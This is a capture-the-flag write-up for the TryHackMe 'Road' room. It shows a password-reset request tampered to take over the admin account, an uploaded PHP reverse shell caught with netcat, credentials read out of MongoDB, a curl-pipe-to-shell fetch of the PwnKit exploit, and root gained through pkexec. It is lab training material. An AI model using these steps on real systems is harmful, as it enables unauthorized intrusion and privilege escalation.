## Road

Room link: https://tryhackme.com/room/road

# Scanning 
I first conducted a scan using nmap with the ```-A``` option. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ nmap -A -Pn 10.10.112.94
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-24 20:39 EST
Nmap scan report for 10.10.112.94
Host is up (0.093s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
```
# Enumeration
I did some enumeration of the http service using both nikto and gobuster.
```
ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://10.10.112.94 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.112.94/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/24 20:42:57 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/phpMyAdmin (Status: 301)
/server-status (Status: 403)
/v2 (Status: 301)
=====================================================
2022/02/24 20:43:44 Finished
=====================================================
```
I also used feroxbuster(```https://github.com/epi052/feroxbuster```) to do some more enumeration. But, it didnt reveal anything of note. 

The /v2 had a login page that allowed me to register for an account. I registered for an account with creds email@gmail.com:test as well as a random set of numbers for phone number. Looking around the site, I wasnt able to interact much. The ```Profile``` page talked about a user named ```admin``` with email ```admin@sky.thm```. 
```
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.
```
With the admin email, I can now try to reset its password using the ```ResetUser``` page. When a user requests a new password, it sends a POST request to ```lostpassword.php``` with the data below. 

```
POST /v2/lostpassword.php HTTP/1.1
Host: [REDACTED]
Content-Length: 540
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[REDACTED]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdvYN3WHUb0ERBBw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[REDACTED]/v2/ResetUser.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=o4uhk2qg369vgql7s0lebn91cj; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Connection: close

------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="uname"

email@gmail.com
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="npass"

test
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="cpass"

test
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="ci_csrf_token"


------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="send"

Submit
------WebKitFormBoundaryxdvYN3WHUb0ERBBw--
```
Therefore, I can change the ```uname``` form-data to be ```admin@sky.thm```. 
```
POST /v2/lostpassword.php HTTP/1.1
Host: 10.10.131.37
Content-Length: 540
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.131.37
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdvYN3WHUb0ERBBw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.131.37/v2/ResetUser.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=o4uhk2qg369vgql7s0lebn91cj; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Connection: close

------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="uname"

admin@sky.thm
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="npass"

test
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="cpass"

test
------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="ci_csrf_token"


------WebKitFormBoundaryxdvYN3WHUb0ERBBw
Content-Disposition: form-data; name="send"

Submit
------WebKitFormBoundaryxdvYN3WHUb0ERBBw--
```
And, I was able to authenticate with credentials ```admin@sky.thm:test```. Now, I moved over to the profile editor again and uploaded a test txt file to see where it saves the profile picture. Looking in the source code of ```profile.php```, it appears the images are saved at ```/v2/profileimages/```. 
```
</div>	
<!-- /v2/profileimages/ -->
<script type="text/javascript">
</html> 
```

# Initial Access 
I created a php reverse shell using pentest monkey and uploaded it as my profile picture. Then, I opened a netcat listener at port 9999 (the port I chose for the php reverse shell). 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
```
And curl'd the location where the images are stored to execute the reverse shell. 
```
ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.131.37/v2/profileimages/php-reverse-shell.php
```
I got a shell! 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.131.37 54696
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 00:34:20 up 26 min,  0 users,  load average: 0.00, 0.02, 0.21
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I was also able to read the user flag. 
```
$ wc -c user.txt
33 user.txt
```
# Privilege Escalation 
I looked around the machine and found that there is a mongodb user within ```/etc/passwd```. 
```
mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
```
Therefore, all I had to do was run ```mongodb``` in the terminal. When I dropped into the db, I listed the available dbs with ```show dbs```. 
```
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```
From the output of ```show dbs```, I checked to see what collections each DB had. The backup db had a collection called ```user``` with credentials for user ```webdeveloper```. 
```
use backup
switched to db backup
show collections
collection
user
db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```
With the credentials, I was able to ssh into the box as user ```webdeveloper```. 
```
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```
The ```sky_backup_utility``` doesnt appear to do anything that is useful for privilege escalation. However, it does appear the box is vulnerable to pkexec priv esc. But, there is a twist because this shell doesnt work well with pkexec since it is non-graphical. Therefore, I had to create two ssh sessions with user ```webdeveloper```. 

I even tried to run the pkexec priv esc normally (https://github.com/ly4k/PwnKit) and it didnt work. 
```
webdeveloper@sky:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),24(cdrom),27(sudo),30(dip),46(plugdev)
webdeveloper@sky:~$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
^C
webdeveloper@sky:~$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
^C
```
Therefore, I set up two ssh sessions. In the first one, I checked to see what the PID was using ```echo $$```. 
```
webdeveloper@sky:~$ echo $$
1438
```
Then, in the second one i ran ```pkttyagent``` to authenticate the process that will be requesting pkexec.
```
webdeveloper@sky:~$ pkttyagent -p 1438
```
Finally, I ran ```pkexec``` with a bash shell. 
```
webdeveloper@sky:~$ pkexec /bin/bash
```
It requested authencation using the ```pkttyagent``` in the other session so I input the password for user ```webdeveloper```. 
```
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/bash' as the super user
Authenticating as: webdeveloper
Password: 
```
And it dropped me into a root shell in the first session! 
```
webdeveloper@sky:~$ pkexec /bin/bash
root@sky:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sky:~# wc -c /root/root.txt
33 /root/root.txt
```
The second session also completed authentication. 
```
webdeveloper@sky:~$ pkttyagent -p 1438
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/bash' as the super user
Authenticating as: webdeveloper
Password: 
==== AUTHENTICATION COMPLETE ===
```

Writeup done with the help of: ```https://wiki.thehacker.nz/docs/thm-writeups/road-medium/```. 